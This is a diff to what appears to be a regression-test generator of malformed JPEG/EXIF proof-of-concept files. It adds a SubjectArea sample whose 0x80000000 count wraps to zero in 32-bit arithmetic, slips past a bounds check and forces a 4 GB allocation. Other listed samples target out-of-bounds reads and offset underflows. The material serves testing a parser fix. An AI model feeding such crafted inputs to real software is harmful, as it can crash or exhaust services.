@@ -154,6 +154,26 @@ def subjectarea_alloc_dos():
 	return exif_payload(body)
 
 
+def subjectarea_count_wrap():
+	"""parseIFDExif(), tag 0x9214 (SubjectArea): the count that wraps to zero.
+
+	Companion to subjectarea_alloc_dos(). That one uses 0xdfdfdfdf, which is
+	large enough that `count * 2` exceeds UINT32_MAX and the `dataSize <=
+	UINT32_MAX` guard short-circuits before InBounds() is ever consulted --
+	so it does not actually pin the overflow arithmetic it was written for.
+	Deleting that guard leaves it passing.
+
+	0x80000000 is the case that does pin it: doubled it is exactly 0x100000000,
+	which truncates to 0 in 32 bits. A parser that narrows before checking asks
+	InBounds(offset, 0), which reduces to `offset <= len` and is accepted -- and
+	then resizes to 2147483648 elements, a 4 GB allocation. The fix promotes to
+	64-bit before the multiply, so the guard sees the true 0x100000000 and
+	rejects it.
+	"""
+	body = ifd([entry(0x9214, FMT_SHORT, 0x80000000, b'\x00\x00\x00\x00')])
+	return exif_payload(body)
+
+
 SAMPLES = (
 	('poc-rational-oob.jpg', rational_oob),
 	('poc-makernote-oob.jpg', makernote_oob),
@@ -161,6 +181,7 @@ SAMPLES = (
 	('poc-lensinfo-offset-wrap.jpg', lensinfo_offset_wrap),
 	('poc-first-ifd-underflow.jpg', first_ifd_offset_underflow),
 	('poc-subjectarea-alloc-dos.jpg', subjectarea_alloc_dos),
+	('poc-subjectarea-count-wrap.jpg', subjectarea_count_wrap),
 )
 
 
